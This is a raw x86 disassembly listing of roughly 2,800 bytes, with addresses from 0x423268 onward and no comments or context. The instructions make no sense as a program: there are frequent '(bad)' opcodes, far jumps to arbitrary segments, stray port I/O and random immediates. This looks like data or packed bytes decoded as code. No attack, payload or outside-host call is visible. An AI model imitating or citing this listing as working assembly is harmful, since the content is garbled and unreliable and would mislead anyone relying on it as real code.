  423268:	xor    esi,esi
  42326a:	xchg   ecx,eax
  42326b:	or     cl,bh
  42326d:	ss nop
  42326f:	mov    eax,ds:0x57c9a9bd
  423274:	xchg   ecx,eax
  423275:	fs inc ebx
  423277:	push   edi
  423278:	push   esi
  423279:	sub    BYTE PTR [edi+0x15527d80],ah
  42327f:	sbb    esi,DWORD PTR [ebx+ecx*8]
  423282:	sub    bl,BYTE PTR [eax+0x5c418dea]
  423288:	popf   
  423289:	outs   dx,BYTE PTR ds:[esi]
  42328a:	xor    eax,0xd3c07a5d
  42328f:	jae    0x423235
  423291:	sbb    al,0xa0
  423293:	adc    al,0xa8
  423295:	int3   
  423296:	cmp    bl,BYTE PTR ds:0xa5fc9d9e
  42329c:	loope  0x423274
  42329e:	dec    ebp
  42329f:	out    0x90,al
  4232a1:	aas    
  4232a2:	or     edx,DWORD PTR [eax]
  4232a4:	mov    es,WORD PTR [edi+0x15]
  4232a7:	ins    BYTE PTR es:[edi],dx
  4232a8:	shl    BYTE PTR es:[esi-0x15],0x36
  4232ad:	jne    0x4232ef
  4232af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232b0:	sbb    al,0xbe
  4232b2:	mov    edi,0x95b07a67
  4232b7:	xchg   ebp,eax
  4232b8:	jge    0x423281
  4232ba:	mov    al,0x4
  4232bc:	jmp    0x42323f
  4232be:	mov    ds:0xefcc3c84,al
  4232c3:	mov    al,0x23
  4232c5:	call   0x7d60f444
  4232ca:	sub    ah,ch
  4232cc:	adc    DWORD PTR [esi+esi*4+0x2f],0x557e9555
  4232d4:	das    
  4232d5:	shl    BYTE PTR [edi+0x46],0xd5
  4232d9:	shl    DWORD PTR [edi-0x12],0x82
  4232dd:	(bad)  
  4232de:	sbb    BYTE PTR [edx+0x73],al
  4232e1:	add    al,0xc9
  4232e3:	mov    ebp,0xb7a7d4d3
  4232e8:	or     al,0xd5
  4232ea:	sbb    DWORD PTR [ecx+esi*2],esi
  4232ed:	nop
  4232ee:	bound  edi,QWORD PTR [ebp-0x46]
  4232f1:	jle    0x423340
  4232f3:	jo     0x4232f6
  4232f5:	adc    BYTE PTR [ecx],0xca
  4232f8:	push   eax
  4232f9:	push   ecx
  4232fa:	mov    bh,0x54
  4232fc:	dec    ebp
  4232fd:	ds xor dl,al
  423300:	push   esi
  423301:	mov    WORD PTR [eax+0x36c9043c],gs
  423307:	cs inc eax
  423309:	pushf  
  42330a:	jno    0x4232c7
  42330c:	rol    DWORD PTR [eax+0x27fe7ebf],1
  423312:	fisttp WORD PTR [ecx-0x3fec9a3]
  423318:	adc    ebx,esp
  42331a:	or     DWORD PTR [edx+0x7267ed30],edi
  423320:	adc    edx,DWORD PTR [ebx-0x21]
  423323:	sub    DWORD PTR [ecx-0x2d],0xffffff89
  423327:	jbe    0x42337f
  423329:	or     BYTE PTR [ecx+esi*8+0x2a],ah
  42332d:	(bad)  
  42332e:	dec    edx
  42332f:	jb     0x423373
  423331:	xchg   esp,eax
  423332:	es aam 0x9
  423335:	int3   
  423336:	ret    0x38a2
  423339:	pop    ecx
  42333a:	adc    cl,dh
  42333c:	sti    
  42333d:	jmp    0x0:0x542faf63
	...
  4233b4:	push   edx
  4233b5:	sub    BYTE PTR [esi],0x69
  4233b8:	(bad)  
  4233b9:	in     eax,dx
  4233ba:	push   edi
  4233bb:	mov    ebx,0x8e4aa104
  4233c0:	adc    edi,DWORD PTR [esi+0x7892c4af]
  4233c6:	add    DWORD PTR [eax],eax
  4233c8:	test   BYTE PTR [eax],0x0
  4233cb:	add    al,al
  4233cd:	jae    0x423418
  4233cf:	(bad)  
  4233d1:	adc    DWORD PTR [esi],edx
  4233d3:	icebp  
  4233d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233d5:	mov    al,gs:0x30e9c020
  4233db:	scas   eax,DWORD PTR es:[edi]
  4233dc:	lock inc edi
  4233de:	rcr    BYTE PTR ds:0xd4da151d,1
  4233e4:	inc    ebx
  4233e5:	pushf  
  4233e6:	loopne 0x42339f
  4233e8:	push   cs
  4233e9:	xchg   ecx,eax
  4233ea:	imul   edx,DWORD PTR ds:0x24694bec,0x1f0f445a
  4233f4:	and    ebp,0x4554df4e
  4233fa:	sbb    DWORD PTR [edx-0x4d],edi
  4233fd:	xchg   edi,eax
  4233fe:	xor    bh,al
  423400:	jno    0x423465
  423402:	adc    DWORD PTR [edx-0x16],eax
  423405:	push   edx
  423406:	ins    BYTE PTR es:[edi],dx
  423407:	add    bl,BYTE PTR ds:0xbc8c81bb
  42340d:	push   0x6f
  42340f:	push   edi
  423410:	ins    BYTE PTR es:[edi],dx
  423411:	push   esp
  423412:	inc    edx
  423413:	(bad)  
  423414:	sti    
  423415:	dec    edx
  423416:	mov    esp,0xeff17ac3
  42341b:	xchg   edx,eax
  42341c:	cwde   
  42341d:	sbb    edx,DWORD PTR [esi+0x18]
  423420:	pop    esp
  423421:	shl    BYTE PTR [esp+ecx*8+0x65],1
  423425:	loop   0x4233fe
  423427:	sub    DWORD PTR [edi+ebx*8-0xd],ecx
  42342b:	xor    BYTE PTR [ebx],dl
  42342d:	adc    ebx,DWORD PTR [edx]
  42342f:	test   al,0x45
  423431:	cmp    edi,eax
  423433:	xchg   edx,eax
  423434:	pop    ebx
  423435:	ja     0x423447
  423437:	jns    0x42347d
  423439:	out    0xfe,al
  42343b:	aad    0x84
  42343d:	adc    DWORD PTR [eax+0x4d7c7347],esi
  423443:	add    al,0x15
  423445:	loope  0x4233ee
  423447:	aas    
  423448:	loope  0x4234b5
  42344a:	rcr    esi,1
  42344c:	loop   0x42343a
  42344e:	int3   
  42344f:	aas    
  423450:	jne    0x423402
  423452:	out    0x21,al
  423454:	lea    ecx,ds:0x955d2b00
  42345a:	sub    dh,0x4
  42345d:	push   0xdf63c98
  423462:	sub    cl,bl
  423464:	and    DWORD PTR [edx-0x27],esp
  423467:	dec    esp
  423468:	loop   0x42342b
  42346a:	retf   
  42346b:	xor    al,0x62
  42346d:	mov    ebx,0x3bde84fc
  423472:	jb     0x4234bb
  423474:	add    DWORD PTR [esi],esp
  423476:	mov    esp,0x1b1277a6
  42347b:	push   ebx
  42347c:	bound  eax,QWORD PTR [eax-0x7ae550e1]
  423482:	add    eax,0xcb2e0dd1
  423487:	fsub   st,st(2)
  423489:	adc    bl,bh
  42348b:	js     0x423426
  42348d:	test   eax,0x7d78c254
  423492:	push   esp
  423493:	xlat   BYTE PTR ds:[ebx]
  423494:	mov    ebp,0x4f5265a1
  423499:	sub    al,0xa9
  42349b:	pop    eax
  42349c:	test   al,0x78
  42349e:	and    al,0x9d
  4234a0:	mov    ebx,0x3221ceda
  4234a5:	jno    0x4234ad
  4234a7:	fstp   TBYTE PTR [esi]
  4234a9:	dec    esi
  4234aa:	ror    DWORD PTR [edi+0x5eb475cd],cl
  4234b0:	inc    ecx
  4234b1:	mov    cl,0x4e
  4234b3:	mul    BYTE PTR [ecx]
  4234b5:	cmp    al,0xc3
  4234b7:	sbb    eax,0xe0b4f539
  4234bc:	mov    bl,0x60
  4234be:	pop    edx
  4234bf:	sub    al,0x98
  4234c1:	mov    edx,0x0
	...
  423532:	add    BYTE PTR [eax],al
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x3d
  423541:	(bad)  
  423542:	aam    0x1d
  423544:	mov    BYTE PTR [ecx+0x1],bh
  423547:	add    dh,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [edi+0x57067e0f],dh
  423551:	aam    0xbc
  423553:	cmp    BYTE PTR [ebp+0x5],cl
  423556:	sub    DWORD PTR [edi-0x3b],edi
  423559:	cld    
  42355a:	cmc    
  42355b:	and    cl,ah
  42355d:	mov    eax,DWORD PTR [ecx+edi*4]
  423560:	pop    ds
  423561:	inc    ecx
  423562:	(bad)  
  423563:	retf   
  423564:	(bad)  
  423565:	push   ss
  423566:	push   esp
  423567:	xlat   BYTE PTR ds:[ebx]
  423568:	in     al,dx
  423569:	ds call 0x8cf2:0x274c40e3
  423571:	fild   DWORD PTR [ecx-0x288d71c6]
  423577:	gs xor eax,0xe02ed6e3
  42357d:	inc    eax
  42357e:	push   0xa9d9710b
  423583:	add    ecx,0x4a9b810f
  423589:	or     eax,0xa4927949
  42358e:	jo     0x423592
  423590:	pop    ebx
  423591:	pop    eax
  423592:	leave  
  423593:	cmp    eax,0xad3531c9
  423598:	push   edi
  423599:	mov    dl,0x61
  42359b:	fcomp  DWORD PTR [ebx+edi*1-0x772be08c]
  4235a2:	les    esp,FWORD PTR [eax-0x7d]
  4235a5:	int    0x8c
  4235a7:	loopne 0x42360c
  4235a9:	and    BYTE PTR [edi-0x47],bh
  4235ac:	icebp  
  4235ad:	mov    edi,0x94b5e8b7
  4235b2:	push   edi
  4235b3:	or     al,0x3b
  4235b5:	mov    dl,0x66
  4235b7:	popf   
  4235b8:	adc    al,0x40
  4235ba:	add    BYTE PTR [ebx-0x7b],al
  4235bd:	ret    0x8e2a
  4235c0:	pop    ebx
  4235c1:	sub    DWORD PTR [edx+0x3a1f9315],esp
  4235c7:	push   cs
  4235c8:	mov    esi,0x2428eeb9
  4235cd:	mov    BYTE PTR [ecx-0x43765c85],dh
  4235d3:	stc    
  4235d4:	mov    dh,0x5a
  4235d6:	pop    esp
  4235d7:	mov    ebp,0x7de0a459
  4235dc:	fdivr  QWORD PTR [ecx+0x47]
  4235df:	or     DWORD PTR [ebp+0x36feaf80],esp
  4235e5:	mov    ds:0xa0b90e3e,al
  4235ea:	cdq    
  4235eb:	test   BYTE PTR [esp+edx*2+0x68],dh
  4235ef:	fsub   DWORD PTR [ecx]
  4235f1:	jmp    0x24b6:0xbed44fa5
  4235f8:	jo     0x4235f2
  4235fa:	repz aad 0x31
  4235fd:	cld    
  4235fe:	or     al,0x94
  423600:	mov    eax,ds:0x5d8590d
  423605:	aas    
  423606:	popf   
  423607:	xchg   DWORD PTR [ecx-0x62],eax
  42360a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42360b:	xchg   ecx,eax
  42360c:	sbb    eax,0xef17c6ec
  423611:	in     al,0xce
  423613:	dec    esp
  423614:	mov    ecx,0xe7c73c2b
  423619:	pop    eax
  42361a:	jecxz  0x423684
  42361c:	pop    edx
  42361d:	jmp    ecx
  42361f:	sub    DWORD PTR [edi+0x6f7bbdb2],esp
  423625:	xor    al,0xd6
  423627:	retf   
  423628:	pusha  
  423629:	mov    ecx,DWORD PTR [ebx-0x75ced4d6]
  42362f:	jo     0x423645
  423631:	ins    BYTE PTR es:[edi],dx
  423632:	stos   BYTE PTR es:[edi],al
  423633:	dec    ebx
  423634:	sub    al,0x85
  423636:	pop    es
  423637:	jae    0x4235dd
  423639:	leave  
  42363a:	adc    DWORD PTR ds:0x7581bf59,0x14
  423641:	xlat   BYTE PTR ds:[ebx]
	...
  4236b2:	add    BYTE PTR [eax],al
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm1,QWORD PTR [ebx+0x7ebabea0]
  4236c5:	jp     0x4236c8
  4236c7:	add    dh,dh
  4236c9:	add    BYTE PTR [eax],al
  4236cb:	add    BYTE PTR [edi+ebp*4+0x61],ch
  4236cf:	mov    ah,0x8e
  4236d1:	push   eax
  4236d2:	adc    al,0xb9
  4236d4:	push   edi
  4236d5:	sub    BYTE PTR [edx+eax*4],bh
  4236d8:	or     ah,BYTE PTR [ebp-0xb]
  4236db:	clc    
  4236dc:	cli    
  4236dd:	cmp    ebx,esp
  4236df:	xor    BYTE PTR [eax],0x4f
  4236e2:	scas   eax,DWORD PTR es:[edi]
  4236e3:	push   edi
  4236e4:	stos   BYTE PTR es:[edi],al
  4236e5:	cdq    
  4236e6:	jae    0x4236ac
  4236e8:	aaa    
  4236e9:	(bad)  
  4236ea:	arpl   WORD PTR [ebp-0x429f4724],sp
  4236f0:	add    al,0xa5
  4236f2:	push   ds
  4236f3:	ficom  DWORD PTR [ecx]
  4236f5:	jmp    0x7cf4:0x2d149fcd
  4236fc:	ret    
  4236fd:	int    0xa6
  4236ff:	push   eax
  423700:	in     al,0xf6
  423702:	gs jb  0x42375a
  423705:	gs dec ebx
  423707:	push   es
  423708:	pop    ds
  423709:	in     al,dx
  42370a:	inc    ebx
  42370b:	in     eax,0xa2
  42370d:	lock mov edi,0xe1257625
  423713:	and    DWORD PTR [eax],esi
  423715:	mov    edi,ss
  423717:	fild   DWORD PTR [edx-0x40af8948]
  42371d:	sti    
  42371e:	test   DWORD PTR [ebx-0x1a],edx
  423721:	test   ebp,ebx
  423723:	gs inc edi
  423725:	and    DWORD PTR ds:0xb83795b6,0xfffffffe
  42372c:	push   0x17e82c0c
  423731:	mov    esp,0xcf38c239
  423736:	cld    
  423737:	(bad)  
  423738:	imul   eax,DWORD PTR [ecx-0x600ae81a],0xffffffb3
  42373f:	fstp   DWORD PTR [edi-0x2b745f1c]
  423745:	int    0x57
  423747:	mov    WORD PTR [ebx-0x3994ee0d],?
  42374d:	stos   DWORD PTR es:[edi],eax
  42374e:	cmp    al,0x7d
  423750:	adc    bh,bl
  423752:	push   edi
  423753:	sti    
  423754:	fwait
  423755:	mov    ecx,0x2b084a3e
  42375a:	and    BYTE PTR [edx-0x67552c91],cl
  423760:	sar    ch,1
  423762:	daa    
  423763:	or     dh,BYTE PTR [eax+eax*8-0x16]
  423767:	xor    eax,0x51f8c436
  42376c:	clc    
  42376d:	adc    eax,0xc385ff24
  423772:	add    dh,al
  423774:	loop   0x4237b1
  423776:	or     cl,0x3e
  423779:	ja     0x4237dc
  42377b:	mov    al,fs:0xdf6ecf2
  423781:	in     eax,0xae
  423783:	jg     0x423782
  423785:	xor    DWORD PTR [esi+0x531baf98],edx
  42378b:	mov    ch,0x75
  42378d:	xchg   esi,eax
  42378e:	push   ebx
  42378f:	xchg   esi,eax
  423790:	push   ebp
  423791:	fnsave [edx-0x61]
  423794:	pusha  
  423795:	push   esi
  423796:	imul   edi,DWORD PTR [esi],0xa9922522
  42379c:	in     eax,0x53
  42379e:	bound  edi,QWORD PTR [edx+0x3d206c10]
  4237a4:	sbb    esi,eax
  4237a6:	inc    esp
  4237a7:	popa   
  4237a8:	xchg   esp,eax
  4237a9:	or     ah,BYTE PTR [ebx+0x2937f68e]
  4237af:	adc    eax,DWORD PTR [ebx+0x3c94684e]
  4237b5:	loope  0x423797
  4237b7:	icebp  
  4237b8:	loop   0x4237eb
  4237ba:	fdivr  QWORD PTR [esi]
  4237bc:	ret    0xd78c
  4237bf:	mov    ah,0xfa
  4237c1:	cmp    BYTE PTR [eax],al
	...
  423833:	add    ch,cl
  423835:	cmp    DWORD PTR [eax-0x10680369],edi
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	(bad)  
  423841:	paddb  mm1,QWORD PTR [esp+esi*2]
  423845:	jnp    0x423848
  423847:	add    dh,dh
  423849:	add    BYTE PTR [eax],al
  42384b:	add    BYTE PTR [ebp-0x5e998033],ch
  423851:	sub    eax,0x28595523
  423856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423857:	ja     0x4237fc
  423859:	mov    BYTE PTR [ebx+0x17bb9fbc],al
  42385f:	sub    dl,ch
  423861:	addr16 jae 0x4237f0
  423864:	mov    ch,0xec
  423866:	mov    esi,0xc430d62a
  42386b:	ds and ah,0x9e
  42386f:	fistp  DWORD PTR [ecx+0x2ce9870e]
  423875:	xor    ebx,ebx
  423877:	bound  edx,QWORD PTR [ebx-0x77521f62]
  42387d:	out    dx,al
  42387e:	fmul   DWORD PTR [eax]
  423880:	jns    0x42387d
  423882:	inc    edx
  423883:	or     eax,0x22bbbd08
  423888:	loopne 0x42382d
  42388a:	adc    ebp,esp
  42388c:	xor    al,0xb1
  42388e:	pop    esi
  42388f:	(bad)
  423892:	aas    
  423893:	(bad)  
  423894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423895:	add    bl,BYTE PTR [edx+0x5ca46b2d]
  42389b:	pop    es
  42389c:	pop    esp
  42389d:	push   eax
  42389e:	jmp    0x423892
  4238a0:	add    BYTE PTR [ecx-0x1e],al
  4238a3:	jecxz  0x4238d7
  4238a5:	(bad)  
  4238a6:	fsin   
  4238a8:	mov    esp,0x5ffba169
  4238ad:	imul   edi,DWORD PTR [esp+edx*8-0x3e3fd4eb],0xe80cef8e
  4238b8:	shr    BYTE PTR [esi+0x6d8cfcd6],cl
  4238be:	push   eax
  4238bf:	aaa    
  4238c0:	sbb    DWORD PTR [ecx],esi
  4238c2:	or     ecx,DWORD PTR [edi+esi*4]
  4238c5:	pusha  
  4238c6:	push   ds
  4238c7:	sbb    DWORD PTR [eax+0x523f5c60],esp
  4238cd:	aas    
  4238ce:	test   BYTE PTR [esi],0x6a
  4238d1:	push   cs
  4238d2:	mov    ?,ecx
  4238d4:	sub    dl,BYTE PTR [ecx]
  4238d6:	arpl   ax,bp
  4238d8:	push   di
  4238da:	pop    esi
  4238db:	push   ds
  4238dc:	xchg   ebx,eax
  4238dd:	xor    DWORD PTR [edi+0x2e],edx
  4238e0:	pop    esi
  4238e1:	jo     0x4238b1
  4238e3:	(bad)  
  4238e4:	jmp    0xeb4b:0xf96c6b82
  4238eb:	jg     0x4238d9
  4238ed:	cmp    eax,0xca6cd3b7
  4238f2:	shl    DWORD PTR [eax],0xee
  4238f5:	xor    eax,DWORD PTR [edi]
  4238f7:	xor    edi,DWORD PTR [edx+0x6e22ad0f]
  4238fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238fe:	push   es
  4238ff:	pop    edx
  423900:	pop    ecx
  423901:	inc    ecx
  423902:	xor    al,0xca
  423904:	aad    0xbb
  423906:	adc    eax,0xd0e1f9f5
  42390b:	and    BYTE PTR [edx-0x30],0xc7
  42390f:	jno    0x423939
  423911:	out    dx,eax
  423912:	dec    eax
  423913:	arpl   WORD PTR [edi],dx
  423915:	sahf   
  423916:	dec    ebx
  423917:	jl     0x423939
  423919:	mov    dh,0x83
  42391b:	cli    
  42391c:	jmp    0x34cd0065
  423921:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  423923:	mov    dl,0xa3
  423925:	jmp    0xf7a7:0xbff4cd9b
  42392c:	mov    ah,0xc1
  42392e:	(bad)  
  423930:	fwait
  423931:	cwde   
  423932:	outs   dx,DWORD PTR ds:[esi]
  423933:	sbb    al,BYTE PTR [esi]
  423935:	popf   
  423936:	ret    
  423937:	rcr    DWORD PTR [eax+0x31],cl
  42393a:	shl    BYTE PTR ds:0x7bd0753e,1
  423940:	xchg   BYTE PTR [ecx],dh
	...
  4239b2:	add    BYTE PTR [eax],al
  4239b4:	xchg   esi,eax
  4239b5:	push   0x18
  4239b7:	mov    ah,bh
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [eax],cs
  4239c1:	sbb    dl,BYTE PTR [eax]
  4239c3:	xlat   BYTE PTR ds:[ebx]
  4239c4:	push   0x7c
  4239c6:	add    DWORD PTR [eax],eax
  4239c8:	test   BYTE PTR [eax],0x0
  4239cb:	add    BYTE PTR [edx],dl
  4239cd:	jmp    0x42397f
  4239cf:	push   ebx
  4239d0:	lods   al,BYTE PTR ds:[esi]
  4239d1:	dec    esi
  4239d2:	pop    ebp
  4239d3:	imul   DWORD PTR [ecx-0x4e66f4e6]
  4239d9:	push   eax
  4239da:	push   esi
  4239db:	std    
  4239dc:	std    
  4239dd:	xor    BYTE PTR [ebx+0x7f6918ab],bl
  4239e3:	jg     0x423a56
  4239e5:	rol    BYTE PTR [eax],0xf0
  4239e8:	or     DWORD PTR [edx+0x48d768ce],esp
  4239ee:	mov    ds:0x27d3070,al
  4239f3:	xor    esp,edi
  4239f5:	push   ebp
  4239f6:	sub    BYTE PTR [eax+0x65],cl
  4239f9:	in     eax,dx
  4239fa:	sub    bh,BYTE PTR [eax+ebx*8+0x1552aabb]
  423a01:	cwde   
  423a02:	inc    ebp
  423a03:	aad    0x36
  423a05:	repnz shl DWORD PTR gs:[esi],0xec
  423a0a:	jmp    0x4892b15
  423a0f:	xor    al,BYTE PTR [edi+ecx*4]
  423a12:	jne    0x4239e4
  423a14:	adc    al,0x24
  423a16:	and    dl,BYTE PTR [ecx-0x7d590348]
  423a1c:	inc    ebp
  423a1d:	lds    eax,FWORD PTR [esi+0x65a233ba]
  423a23:	push   ebp
  423a24:	in     al,dx
  423a25:	dec    edi
  423a26:	sahf   
  423a27:	mov    al,ds:0x723e1dde
  423a2c:	nop
  423a2d:	adc    bl,BYTE PTR [ecx+ebx*8-0x5a7de967]
  423a34:	cmp    ecx,ebp
  423a36:	and    al,0xbd
  423a38:	cmp    eax,0xc1bfd5e2
  423a3d:	sahf   
  423a3e:	jnp    0x423aa2
  423a40:	dec    eax
  423a41:	call   DWORD PTR [eax-0x220fa8cf]
  423a47:	daa    
  423a48:	mov    esp,0xb8398594
  423a4d:	mov    WORD PTR [edx+ecx*1-0x64],gs
  423a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a52:	xchg   ebx,eax
  423a53:	stos   BYTE PTR es:[edi],al
  423a54:	jl     0x423a50
  423a56:	cld    
  423a57:	adc    BYTE PTR [ecx+0x20692859],ch
  423a5d:	mov    ebp,0x6a462033
  423a62:	lahf   
  423a63:	repz push ebx
  423a65:	fs dec ebx
  423a67:	aas    
  423a68:	lds    esi,FWORD PTR [ecx+eax*4]
  423a6b:	lds    edx,FWORD PTR [eax]
  423a6d:	mov    eax,ds:0xf1d0725a
  423a72:	popa   
  423a73:	shl    DWORD PTR [edx+eiz*2-0x755da01f],0xea
  423a7b:	stc    
  423a7c:	not    esp
  423a7e:	xor    DWORD PTR [ebx],ebp
  423a80:	mul    DWORD PTR [eax]
  423a82:	xor    ebx,esi
  423a84:	or     DWORD PTR [ecx-0x1],ecx
  423a87:	jo     0x423ad6
  423a89:	or     eax,0xf652d3b2
  423a8e:	sbb    edx,DWORD PTR [edx-0x37f981f0]
  423a94:	inc    eax
  423a95:	push   es
  423a96:	pusha  
  423a97:	pop    ds
  423a98:	push   esi
  423a99:	xchg   edi,eax
  423a9a:	int3   
  423a9b:	aas    
  423a9c:	add    BYTE PTR [eax],dl
  423a9e:	loopne 0x423aea
  423aa0:	test   ebx,0x3b5b6dfe
  423aa6:	imul   edi,DWORD PTR [edi-0x78fddc50],0xb316735b
  423ab0:	push   edx
  423ab1:	les    edi,FWORD PTR [ebx+0xf9fc5ea]
  423ab7:	mov    edi,0x2a22dc21
  423abc:	int3   
  423abd:	adc    BYTE PTR [esi+ebp*8+0x3c20],dh
	...
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0x3f
  423b41:	cmp    al,dl
  423b43:	mov    eax,ds:0x17d60
  423b48:	test   BYTE PTR [eax],0x0
  423b4b:	add    BYTE PTR [ebx-0x3bd0b4cb],cl
  423b51:	out    0xe8,al
  423b53:	cmp    eax,0x551f9fc6
  423b58:	xchg   edi,eax
  423b59:	push   cs
  423b5a:	xor    ch,BYTE PTR [ecx+0x10354b8]
  423b60:	retf   0x1f5a
  423b63:	sbb    BYTE PTR [esi+0x40ce3f50],ch
  423b69:	test   eax,0xc3f904c2
  423b6e:	repz lds esp,FWORD PTR [eax-0x1fc585c]
  423b75:	out    0x6a,al
  423b77:	jge    0x423b03
  423b79:	loop   0x423bdf
  423b7b:	(bad)  
  423b7c:	int    0xba
  423b7e:	push   edi
  423b7f:	push   edx
  423b80:	sbb    al,0x95
  423b82:	data16 mov al,ds:0x8b77ee07
  423b88:	in     al,dx
  423b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b8a:	or     eax,ebp
  423b8c:	push   edi
  423b8d:	or     eax,0x968daee9
  423b92:	xor    eax,0x1c6ed912
  423b97:	jecxz  0x423b81
  423b99:	iret   
  423b9a:	les    ecx,FWORD PTR [ecx-0x5e]
  423b9d:	daa    
  423b9e:	popa   
  423b9f:	fcmovnbe st,st(7)
  423ba1:	out    0x6c,al
  423ba3:	jnp    0x423bc0
  423ba5:	out    0x2a,eax
  423ba7:	pop    edx
  423ba8:	sti    
  423ba9:	push   edx
  423baa:	dec    ecx
  423bab:	arpl   WORD PTR [edi-0x44],si
  423bae:	sahf   
  423baf:	imul   edx,DWORD PTR [edx-0x4bb8edc4],0xf48d6084
  423bb9:	gs push 0x9968e387
  423bbf:	test   eax,0xea40bfe0
  423bc4:	(bad)  [esp+ecx*8+0x52]
  423bc8:	jecxz  0x423bf7
  423bca:	(bad)  
  423bcb:	mov    dl,0xc8
  423bcd:	mov    bh,0x3d
  423bcf:	stos   DWORD PTR es:[edi],eax
  423bd0:	ret    
  423bd1:	cli    
  423bd2:	inc    edi
  423bd3:	imul   ecx,DWORD PTR [esi-0x22],0x7aff69bb
  423bda:	jno    0x423ba3
  423bdc:	sub    BYTE PTR [eax],cl
  423bde:	test   BYTE PTR [edi],ch
  423be0:	std    
  423be1:	in     eax,0x29
  423be3:	mov    eax,ebp
  423be5:	mov    eax,ds:0xca4916a6
  423bea:	inc    edi
  423beb:	cmp    al,0xc7
  423bed:	sbb    BYTE PTR [eax],cl
  423bef:	ret    0xce6f
  423bf2:	push   0xcba3c284
  423bf7:	or     dl,BYTE PTR [edx+0xb]
  423bfa:	add    BYTE PTR [ebx],0x3f
  423bfd:	jne    0x423b93
  423bff:	mov    edi,0x40f16051
  423c04:	hlt    
  423c05:	push   es
  423c06:	(bad)  
  423c07:	popf   
  423c08:	clc    
  423c09:	pop    esi
  423c0a:	xor    bh,BYTE PTR [esi+0x25]
  423c0d:	out    0x14,al
  423c0f:	adc    eax,0xc749d608
  423c14:	test   al,0x9a
  423c16:	mov    BYTE PTR [eax],cl
  423c18:	dec    ebx
  423c19:	sub    eax,0x15bcde45
  423c1e:	(bad)  
  423c1f:	mov    bl,BYTE PTR [edx]
  423c21:	sub    dh,ch
  423c23:	dec    edi
  423c24:	adc    edi,DWORD PTR [ebx-0x648b04c7]
  423c2a:	cmp    DWORD PTR [ebp+0x334d30df],ecx
  423c30:	loop   0x423cae
  423c32:	sbb    BYTE PTR [edx+0x85b7f4e],bl
  423c38:	add    al,0x12
  423c3a:	and    ebp,DWORD PTR ds:0xf46c9e0a
  423c40:	and    eax,0x56
	...
  423cb1:	add    BYTE PTR [eax],al
  423cb3:	add    BYTE PTR [edi+0x626d60bd],bh
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0xb10b,0x8
  423cc3:	lock push esi
  423cc5:	jle    0x423cc8
  423cc7:	add    dh,dh
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    BYTE PTR ds:0xca2de52d,dl
  423cd1:	ret    0x18b7
  423cd4:	sahf   
  423cd5:	gs jbe 0x423d21
  423cd8:	dec    esp
  423cd9:	or     esp,DWORD PTR [ecx+0x18eecb4b]
  423cdf:	push   es
  423ce0:	(bad)  
  423ce1:	jcxz   0x423d01
  423ce4:	xor    edx,ebx
  423ce6:	fsub   st,st(6)
  423ce8:	sub    bh,BYTE PTR [edi]
  423cea:	ret    
  423ceb:	inc    ecx
  423cec:	jb     0x423cff
  423cee:	loopne 0x423cb5
  423cf0:	push   0xffffff84
  423cf2:	aas    
  423cf3:	pminub mm4,QWORD PTR [edi]
  423cf6:	in     eax,0x29
  423cf8:	rcr    BYTE PTR [ebp+ebp*2-0x6d1d2862],cl
  423cff:	je     0x423d57
  423d01:	add    bh,BYTE PTR [esi+0x654e1991]
  423d07:	call   0x4122:0x677ebfaa
  423d0e:	imul   edx,ebx,0xffffff8d
  423d11:	jmp    0x89ae3054
  423d16:	ja     0x423cae
  423d18:	jl     0x423d30
  423d1a:	jl     0x423cfc
  423d1c:	mov    BYTE PTR [eax+0x22b93b2d],bh
  423d22:	daa    
  423d23:	sub    DWORD PTR [edx],esi
  423d25:	jl     0x423d5d
  423d27:	test   BYTE PTR [edi],cl
  423d29:	gs scas eax,DWORD PTR es:[edi]
  423d2b:	les    esi,FWORD PTR [esp+ebp*4]
  423d2e:	nop
  423d2f:	xchg   esi,eax
  423d30:	ss pop esi
  423d32:	lahf   
  423d33:	jmp    0xadcbbd97
  423d38:	out    0x2a,eax
  423d3a:	ds icebp 
  423d3c:	jnp    0x423d78
  423d3e:	in     eax,0x9d
  423d40:	or     BYTE PTR [edx+0x73534f0d],dh
  423d46:	pop    esi
  423d47:	pop    es
  423d48:	jmp    0xfb7e:0xc3f9c678
  423d4f:	ret    0x30b7
  423d52:	push   ebp
  423d53:	fisttp DWORD PTR [edx-0x436dd406]
  423d59:	xchg   edx,eax
  423d5a:	push   esp
  423d5b:	ins    DWORD PTR es:[edi],dx
  423d5c:	ret    0xe090
  423d5f:	repnz add DWORD PTR [eax+edx*8],esi
  423d63:	xor    DWORD PTR [ebp-0xa],ecx
  423d66:	sbb    BYTE PTR [eax],0x19
  423d69:	lock mov fs,ebx
  423d6c:	fbld   TBYTE PTR [ebp-0x33a055ac]
  423d72:	popf   
  423d73:	add    eax,0x1ecdd2e
  423d78:	mov    ?,WORD PTR [eax-0x1b]
  423d7b:	push   esp
  423d7c:	daa    
  423d7d:	or     ch,ah
  423d7f:	xor    bh,al
  423d81:	(bad)  
  423d82:	stc    
  423d83:	sbb    BYTE PTR [esi+0x75],bl
  423d86:	retf   
  423d87:	jb     0x423d7a
